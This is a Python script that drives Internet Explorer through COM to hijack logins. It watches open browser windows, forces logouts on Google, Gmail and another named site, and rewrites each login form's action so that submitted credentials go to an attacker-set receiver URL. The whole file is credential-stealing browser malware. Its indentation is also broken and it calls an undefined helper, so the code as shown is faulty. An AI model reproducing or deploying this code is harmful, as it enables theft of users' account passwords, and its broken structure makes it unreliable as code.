import win32com.client
import time
import urlparse
import urllib

data_receiver = "http://localhost:8000/"

target_sites = {}
target_sites["www.radoslaw.kierznowski.com"] = \
            {"logout_url"           : None,
             "logout_form"          :"logout_form",
             "login_from_index"     : 0,
             "owned"                : False}

target_sites["accounts.google.com"] = \
            {"logout_url"           : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
             "logout_form"          : None,
             "login_from_index"     : 0,
             "owned"                : False}

target_sites["www.gmail.com"]   = target_sites["accounts.google.com"]
target_sites["mail.google.com"] = target_sites["accounts.google.com"]

clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'

windows = win32com.client.Dispatch(clsid)

while True:

    for browser in windows:

        url = urlparse.urlparse(browser.LocationUrl)

        if url.hostname in target_sites:

            if target_sites[url.hostname]["owned"]:

        if target_sites[url.hostname]["logout_url"]:

            browser.Navigate(target_sites[url.hostname]["logout_url"])
            wait_for_browser(browser)

        else:

            full_doc = browser.Document.all

            for i in full_doc:

                try:

                    if i.id == target_sites[url.hostname]["logout_form"]:

                        i.submit()
                        wait_for_browser(browser)

                except:

                    pass

        try:

            login_index = target_sites[url.hostname]["login_from_index"]
            login_page = urllib.quote(browser.LocationUrl)
            browser.Document.forms[login_index].action = "%s%s" % (data_receiver, login_page)
            target_sites[url.hostname]["owned"] = True

        except:

            pass

    time.sleep(5)
